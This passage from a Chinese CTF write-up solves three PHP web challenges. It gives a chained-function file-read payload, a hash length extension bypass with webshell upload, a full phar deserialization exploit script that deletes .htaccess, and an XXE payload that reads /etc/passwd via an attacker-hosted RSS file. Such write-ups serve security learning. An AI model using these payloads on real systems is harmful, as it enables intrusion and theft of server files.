class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── code</span><br><span class="line">│&nbsp;&nbsp; └── index.php</span><br><span class="line">└── index.php</span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span> directory, <span class="hljs-number">2</span> files</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们运行的源代码是在 code 文件夹下，而 flag 是在与 code 目录平级的 index.php 文件中，意思就是我们需要获得<code>../index.php</code>的源码，我们可以构建一个类似的代码环境方便调试。</p><p>所以第一个我们比较容易想到的是用<code>scandir</code>函数拿到当前目录，得到一个数组，使用<code>chdir</code>函数跳到上级目录，再用<code>readfile</code>进行读取。</p><p>首先用<code>scandir</code>得到当前目录数组：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(scandir(<span class="hljs-string">'.'</span>));</span><br><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) {</span><br><span class="line">  [<span class="hljs-number">0</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">1</span>) <span class="hljs-string">"."</span></span><br><span class="line">  [<span class="hljs-number">1</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span></span><br><span class="line">  [<span class="hljs-number">2</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">8</span>) <span class="hljs-string">"test.php"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到<code>..</code>是在第二个，也就是数组的 array[1] 位置，于是我们可以使用<code>next</code>函数获得数组第二个字符串。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(next(scandir(<span class="hljs-string">'.'</span>)));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line">string(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接着用<code>chdir</code>函数跳到上级目录：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(chdir(next(scandir(<span class="hljs-string">'.'</span>))));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line">bool(<span class="hljs-keyword">true</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然有一个 PHP Notice ，但是也误伤大雅，这里关键的是<code>chdir</code>返回值是个<code>bool(true)</code>，并没有返回上级目录数组什么的，这样我们貌似就不能获取到上级目录下的文件了，也就不能拿到源码了。</p><p>我们暂时先抛开这个问题，先假设到了上级目录，那我们是不是也可以像上面的方法一样，用<code>sandir</code>获得数组来进一步读取文件呢？</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(scandir(<span class="hljs-string">'.'</span>));</span><br><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) {</span><br><span class="line">  [<span class="hljs-number">0</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">1</span>) <span class="hljs-string">"."</span></span><br><span class="line">  [<span class="hljs-number">1</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span></span><br><span class="line">  [<span class="hljs-number">2</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">4</span>) <span class="hljs-string">"code"</span></span><br><span class="line">  [<span class="hljs-number">3</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">9</span>) <span class="hljs-string">"index.php"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样我们就可以看到我们的目标文件了，因为目录排序的原因， i 在 c 的后面，所以我们肯定可以直接用<code>end</code>函数直接获取这个数组的最后一个拿到<code>index.php</code>字符串，</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(end(scandir(<span class="hljs-string">'.'</span>)));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line">string(<span class="hljs-number">9</span>) <span class="hljs-string">"index.php"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接着我们就可以愉快的用<code>readfile</code>来获取 flag 了</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(readfile(end(scandir(<span class="hljs-string">'.'</span>))));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$flag = <span class="hljs-string">"This is index.php! And you get flag!"</span>;int(<span class="hljs-number">54</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>前面后面我们都打通了，现在唯一缺的就是如何把<code>chdir</code>返回的<code>bool(true)</code>变成<code>.</code>以便<code>scandir</code>函数调用的问题了。</p><p>经过 @rmb122 师傅的发掘，<code>microtime</code>可以接受一个<code>bool(true)</code>参数，并返回当前 Unix 时间戳和微秒数</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(microtime(<span class="hljs-keyword">true</span>));</span><br><span class="line">float(<span class="hljs-number">1568657564.377</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>乍一看没什么用，但是我们依然可以配合<code>chr</code>函数来进行 ascii 码转换，当时间到了指定时间，我们就可以拿到<code>.</code>字符了！于是这样一开始如何构造最开始的<code>.</code>这个问题也可以解决了！</p><p>于是整个 payload 就是：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(microtime(chdir(next(scandir(chr(time())))))))));</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个方法的缺点也比较明显，需要爆破…于是我用 intruder 爆了一下，运气也比较好，5s 就出来了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190917021622.png" alt=""></p><h2 id="EzCMS"><a href="#EzCMS" class="headerlink" title="EzCMS"></a>EzCMS</h2><p>这个题不想评价太多…拿我出的 SUCTF upload labs 2 来魔改的题，这里就简要说说点，不再详细赘述了。</p><p>这个题也是个上传的环境，但是上传有一个限制以及还有一个可疑的<code>__call</code>魔术方法</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $username;</span><br><span class="line">    <span class="hljs-keyword">public</span> $password;</span><br><span class="line">    <span class="hljs-keyword">public</span> $admin;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;username = $_SESSION[<span class="hljs-string">'username'</span>];</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;password = $_SESSION[<span class="hljs-string">'password'</span>];</span><br><span class="line">        $secret = <span class="hljs-string">"********"</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-string">"admin"</span>){</span><br><span class="line">            <span class="hljs-keyword">if</span> ($_COOKIE[<span class="hljs-string">'user'</span>] === md5($secret.<span class="hljs-keyword">$this</span>-&gt;username.<span class="hljs-keyword">$this</span>-&gt;password)){</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($name, $arguments)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;admin-&gt;open(<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-keyword">$this</span>-&gt;password);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里可以用 hash 长度拓展来绕过，hashpump 就行。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $file_tmp, $size)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;upload_dir = <span class="hljs-string">'sandbox/'</span>.md5($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-keyword">$this</span>-&gt;upload_dir)){</span><br><span class="line">    mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_dir, <span class="hljs-number">0777</span>, <span class="hljs-keyword">true</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (!is_file(<span class="hljs-keyword">$this</span>-&gt;upload_dir.<span class="hljs-string">'/.htaccess'</span>)){</span><br><span class="line">    file_put_contents(<span class="hljs-keyword">$this</span>-&gt;upload_dir.<span class="hljs-string">'/.htaccess'</span>, <span class="hljs-string">'lolololol, i control all'</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;size = $size;</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;file_tmp = $file_tmp;</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;content_check = <span class="hljs-keyword">new</span> Check(<span class="hljs-keyword">$this</span>-&gt;file_tmp);</span><br><span class="line">  $profile = <span class="hljs-keyword">new</span> Profile();</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;checker = $profile-&gt;is_admin();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然可以上传任意后缀的文件，但是上传目录下有被控制的<code>.htaccess</code>，导致我们上传的 php 文件不能解析，而且每次登录都会生成这个<code>.htaccess</code>文件，不能被绕过。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>{</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">  </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;checker)){</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>整个题唯一一个<code>__destruct</code>函数，不用猜就知道是利用这个点</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>{</span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_detail</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="hljs-keyword">$this</span>-&gt;filepath)){</span><br><span class="line">      <span class="hljs-keyword">die</span>(<span class="hljs-string">"nonono~"</span>);</span><br><span class="line">    }</span><br><span class="line">    $mine = mime_content_type(<span class="hljs-keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $store_path = <span class="hljs-keyword">$this</span>-&gt;open(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $res[<span class="hljs-string">'mine'</span>] = $mine;</span><br><span class="line">    $res[<span class="hljs-string">'store_path'</span>] = $store_path;</span><br><span class="line">    <span class="hljs-keyword">return</span> $res;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里是一个很明显的 phar 反序列化的点，触发函数是<code>mime_content_type</code>，触发流是<code>php://filter</code>。</p><p>整个题的意思也比较明显，但是一开始不是很 get 到点，给出的那个<code>__call</code>魔术方法有点莫名其妙，然后一直去日<code>move_uploaded_file</code>方法去了，结果发现这个根本日不动。然后经过马师傅的提醒，get 了一个 <a href="https://www.php.net/manual/en/ziparchive.open.php" target="_blank" rel="noopener">ZipArchive::open</a> 函数，然后一切就明白了，随手一搜就是个原题魔改题 <a href="https://www.anquanke.com/post/id/95896" target="_blank" rel="noopener">Insomni’hack Teaser 2018比赛Write Up：File Vault题目</a>，可以使用 ZipArchive-&gt;open 方法达到删除目标文件。</p><p>所以整个利用链就比较清晰了， hash 拓展绕过上传限制，上传一个 webshell ，再构造一个 ZipArchive 类的 phar 包上传，用<code>php://filter/resource=phar://</code>触发 phar 反序列化删除自己目录下的<code>.htaccess</code>文件，直接 getflag 。</p><p>构造 phar 包的代码如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Check</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filepath;</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $size;</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line">    <span class="hljs-keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="hljs-keyword">public</span> $content_check;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> $username = <span class="hljs-string">"/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess"</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $password = <span class="hljs-string">"9"</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $a = <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">unlink(<span class="hljs-string">"1.phar"</span>);</span><br><span class="line"></span><br><span class="line">$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"1.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="hljs-comment">// <span class="hljs-meta">&lt;?php</span> __HALT_COMPILER();</span></span><br><span class="line">$phar-&gt;setStub(<span class="hljs-string">"GIF89a"</span> . <span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span></span><br><span class="line">$a = <span class="hljs-keyword">new</span> ZipArchive();</span><br><span class="line">$b = <span class="hljs-keyword">new</span> Profile();</span><br><span class="line">$b-&gt;admin = $a;</span><br><span class="line">$o = <span class="hljs-keyword">new</span> File();</span><br><span class="line">$o-&gt;checker = $b;</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); </span><br><span class="line">    <span class="hljs-comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h2><p>根据题目名字，因为 rss 本身也是个 XML ，这里的考点之一肯定就是 xxe 了。</p><p>于是直接拿一个 rss xxe 模版来改一下</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">title</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">title</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"2.0"</span> </span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>先知安全技术社区<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>http://xz.aliyun.com/forum/<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>先知安全技术社区<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">atom:link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://xz.aliyun.com/forum/feed/"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"self"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">atom:link</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">language</span>&gt;</span>zh-hans<span class="hljs-tag">&lt;/<span class="hljs-name">language</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">lastBuildDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="hljs-tag">&lt;/<span class="hljs-name">lastBuildDate</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>CVE-2018-14418 擦出新火花<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">pubDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="hljs-tag">&lt;/<span class="hljs-name">pubDate</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">guid</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="hljs-tag">&lt;/<span class="hljs-name">guid</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Url_parse 可以按照上面 boring_code 那题使用<code>,</code>来绕过，在自己的端口起个 http 服务，放上面的 xml 文件就行了，类似<code>http://your_vps:80,baidu.com:80/file</code></p><p>成功读到<code>/etc/passwd</code>，但是读不到<code>/flag</code>，接着用 php 伪协议读题目源码：</p><p>index.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 